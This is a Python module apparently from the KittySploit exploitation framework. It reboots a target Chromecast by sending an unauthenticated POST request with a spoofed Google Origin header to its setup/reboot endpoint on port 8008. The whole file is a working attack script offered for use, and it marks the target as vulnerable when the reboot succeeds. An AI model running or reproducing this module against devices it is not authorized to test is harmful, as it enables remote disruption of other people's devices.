from kittysploit import *
from lib.protocols.http.http_client import Http_client

class Module(Auxiliary, Http_client):

	__info__ = {
			'name': 'Reboot a Chromecast',
			'description': 'With this module you can reboot a specified chromecast',
			'author': 'KittySploit Team',
		}

	def run(self):
		
		headers = {
			'Content-Type':'application/json',
			'Origin': 'https://www.google.com',
			'Host': "{}:8008".format(self.target)
		}		
		
		reboot = self.http_request(
						method = "POST",
						path = ":8008/setup/reboot",
						headers = headers,
						data = {"params":"now"}
						)
		
		if reboot.status_code == 200:
			print_success("Rebooted!")
			Vulnerable.SUCCESS()
		else:
			print_error("Error, you should check HTTP Code: {}".format(reboot.status_code))	
			fail.NotVulnerable()
